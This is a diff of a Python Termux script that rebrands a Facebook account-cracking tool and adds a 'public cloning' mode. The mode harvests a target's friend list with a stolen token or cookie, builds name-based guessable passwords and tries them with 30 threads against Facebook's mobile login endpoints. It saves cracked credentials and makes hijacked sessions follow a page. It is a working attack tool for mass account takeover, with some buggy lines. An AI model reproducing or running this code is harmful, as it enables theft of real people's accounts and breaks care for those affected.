@@ -84,14 +84,14 @@ def clear():
 def back():
 	login()
 
-TONMOY="TONMOY-"
-imt="-AK407=="
+TALHA="Talha-"
+imt="-Busra4786=="
 ak="Lover-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.mrTONMOY-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.mrTALHA-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.mrTONMOY-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.mrTALHA-cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -116,15 +116,200 @@ def jalan(z):
 ############### #LOGO############## ## 
 
 # LOGIN
-#xxxxxxxx
+def Public():
+	clear()
+	print(logo)
+	print  (' [01] Login With Token\n [02] Login With Cookie')
+	pil=input('\n [#] Select One : ')
+	if pil in ['1','01']:
+		panda = input(' [+] Token : ')
+		akun=open('.token.txt','w').write(panda)
+		try:
+			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
+			tes3 = json.loads(tes.text)['id']
+			print (" [] Login Successful")
+			login()
+		except KeyError:
+			print( ' [×] Login Failed ')
+			time.sleep(2.5)
+			Public()
+		except requests.exceptions.ConnectionError:
+			print ( ' [×] Connection Timeout')
+			exit()
+	elif pil in ['2','02']:
+		try:
+			cookie=input(" [+] Cookie : ")
+			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
+			find_token = re.search("(EAAG\w+)", data.text)
+			ken=open(".token.txt", "w").write(find_token.group(1))
+			print (" [] Login Successful")
+			login()
+		except Exception as e: 
+			os.system("rm -f .token.txt")
+			print( ' [×] Login Failed ')
+			time.sleep(2.5)
+			login()
+			exit()
+def public_menu():
+	try:
+		token = open('.token.txt','r').read()
+	except IOError:
+		exit()
+	clear()
+	print(logo)
+	pil = input('\n [+] Enter ID Target : ')
+	try:
+		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
+		for pi in koh2['friends']['data']:
+			id.append(pi['id']+'|'+pi['name'])
+		print(' [] Total : '+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print (' [#] Connection Time Out')
+		exit()
+	except (KeyError,IOError):
+		print(' [!] Not public Or Token Expire')
+		exit()
+def File():
+			clear()
+			print(logo)
+			try:
+				fileX = input ('\n [+] Enter file path : ') 
+				for line in open(fileX, 'r').readlines():
+					id.append(line.strip())
+				setting()
+			except IOError:
+				exit("\n [!] file %s not found"%(fileX))
+
+def setting():
+	hu = ("2")
+	if hu in ['1','01']:
+		for tua in sorted(id):
+			id2.append(tua)
+
+	elif hu in ['2','02']:
+		muda=[]
+		for bacot in sorted(id):
+			muda.append(bacot)
+		bcm=len(muda)
+		bcmi=(bcm-1)
+		for xmud in range(bcm):
+			id2.append(muda[bcmi])
+			bcmi -=1
+	elif hu in ['3','03']:
+		for bacot in id:
+			xx = random.randint(0,len(id2))
+			id2.insert(xx,bacot)
+	else:
+		print (' [!] Choose Correct Option')
+		exit()
+	clear()
+	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
+	hc = input ("\n [#] method : ")
+	if hc in ['1','01']:
+		method.append('mobile')
+	elif hc in ['2','02']:
+		method.append('free')
+	else:
+		method.append('mobile')
+	passmenu()
+def passmenu():
+	clear()
+	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
+	passmen=input('\n [#] Select Pass : ')
+	if passmen in ['1','01']:
+		first()
+	elif passmen in ['2','02']:
+		name()
+	elif passmen in ['3','03']:
+		name2()
+	else:
+		passmenu()
+		
+def first():
+	clear()
+	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = ['445566']
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(free,idf,pwv)
+			else:
+				pool.submit(crack,idf,pwv)
+def name():
+	clear()
+	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			try:
+				idf,nmf = yuzong.split('|')
+				xz = nmf.split(' ')
+				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+				else:
+					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
+				if 'mobile' in method:
+					pool.submit(crack,idf,pwv)
+				elif 'free' in method:
+					pool.submit(free,idf,pwv)
+				else:
+					pool.submit(crack,idf,pwv)
+			except:
+				pass
+def name2():
+	clear()
+	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
+	with tred(max_workers=30) as pool:
+		for yuzong in id2:
+			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
+			frs = nmf.split(' ')[0]
+			pwv = ['445566']
+			if len(nmf)<6:
+				if len(frs)<3:
+					pass
+				else:
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+			else:
+				if len(frs)<3:
+					pwv.append(nmf)
+				else:
+					pwv.append(nmf)
+					pwv.append(frs+'123')
+					pwv.append(frs+'12345')
+					pwv.append(frs+'1234')
+					pwv.append(frs+'786')
+			if 'mobile' in method:
+				pool.submit(crack,idf,pwv)
+			elif 'free' in method:
+				pool.submit(free,idf,pwv)
+			else:
+				pool.submit(crack,idf,pwv)
 	
 # CRACKER
-def File(idf,pwv):
+def crack(idf,pwv):
 	global loop,ok,cp
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ TONMOY ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ TALHA ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -139,14 +324,14 @@ def File(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ TONMOY-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ TALHA-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ TONMOY-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ TALHA-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -163,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ TONMOY ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ TALHA ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -177,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ TONMOY-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ TALHA-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ TONMOY-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ TALHA-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/TONMOY-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/TALHA-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -203,6 +388,7 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""
+       
 \033[1;37m████████  ██████  ███    ██ \033[1;32m███    ███  ██████  ██    ██ 
 \033[1;37m   ██    ██    ██ ████   ██ \033[1;32m████  ████ ██    ██  ██  ██  
 \033[1;37m   ██    ██    ██ ██ ██  ██ \033[1;32m██ ████ ██ ██    ██   ████   
@@ -210,11 +396,11 @@ logo = ("""
 \033[1;37m   ██     ██████  ██   ████\033[1;32m ██      ██  ██████     ██    
                                              
 \033[1;37m ══════════════════════════════════════════════════
-\033[1;37mAUTHOR  : \033[1;32mTONMOY MAHATO                                                          
-\033[1;37mGITHUB  : \033[1;32mtonmoy404-cyber                                                             
-\033[1;37mYOU TUBE  : \033[1;32mTONMOY MAHATO                                                          
-\033[1;37mTOOL  : \033[1;32mFILE CRACK                                                                        
-\033[1;37m ══════════════════════════════════════════════════\033[1;37m""")
+\033[1;37mAUTHOR  : \033[1;32mTONMOY MAHATO                                                          ║
+\033[1;37mGITHUB  : \033[1;32mtonmoy404-cyber                                                             ║
+\033[1;37mYOU TUBE  : \033[1;32mTONMOY MAHATO                                                          ║
+\033[1;37mTOOL  : \033[1;32mFILE CRACK                                                                        ║
+\033[1;37m ══════════════════════════════════════════════════""")
 
 class Main:
 	def __init__(self):
@@ -225,36 +411,49 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("")
-		print("\033[1;32m [1] Subscribe My Youtube Channel")
+		print("\033[1;37m     Youtube Channel  No Subscribe No Approved")
+		print("")
+		print("\033[1;32m [1] First Subscribe My Youtube Channel")
 		print("\033[1;33m [2] Exit")
 		print("")
-		Baloch = input("\n\033[1;31m  Chose --> \033[1;32m")
+		Baloch = input("\n\033[1;31m  Chose ==> \033[1;32m")
 		if Baloch in ["", " "]:
 			exit()
 		elif Baloch in ["2", "02"]:
 			print("    Thanks")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open https://youtube.com/channel/UCzc-ArnXynlC_QjrDWCQ9eg")
+			os.system("xdg-open https://youtube.com/c/TalhaTechnologychannel")
 			print("")
+			time.sleep(2.0)
+			print("\033[1;33m    Type Your Youtube Gmail : ")
+			print("")
+			input("\n\033[1;32m  Type Name ==> \033[1;36m")
+			time.sleep(2.1)
+			print("")
+			print("\033[1;32m Successful Bro")
 			time.sleep(2.0)
 			os.system("clear")
 		print(logo)
 		print("\n [1] File Cloning")
+		print(" [2] Public Cloning")
 		print(" [E] Exit Programming\n")
-		TONMOY =input(" Choose : ")
-		if TONMOY in ["1", "01"]:
+		TALHA =input(" Choose : ")
+		if TALHA in ["1", "01"]:
 			File()
+		if TALHA in ["2", "02"]:
+			Public()
 			exit()
 		else:
 			print (" Select Correctly ")
 			time.sleep(1)
 			Main()
+
 def Subscraption():
-	key1=open('/data/data/com.termux/files/usr/bin/.mrTONMOY-cov', 'r').read()
+	key1=open('/data/data/com.termux/files/usr/bin/.mrTALHA-cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/tonmoy404-cyber/approval.txt.git").text
+	r1=requests.get("https://pastebin.com/p3jbWM14").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -267,20 +466,20 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m TONMOY Toll Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m TALHA Toll Paid You Need Get Approved First\033[1;37m\n")
 		print(" \033[1;32m Note : Paid Tolls Free  HA JANI LOG \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
 		print(" Copy And Send Key To Admin")
 		print ("")
-		print (" Your Key : "+ak+TONMOY+key1)
+		print (" Your Key : "+ak+Talha+key1)
 		print ("")
 		name = input(" Your Name : ")
 		print ("")
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
-		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+TONMOY+''+key1
-		os.system('am start https://wa.me/+8801766804626?text=' + tks)
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Talha+''+key1
+		os.system('am start https://wa.me/+8801304002896?text=' + tks)
 		Subscraption()        
 Main()
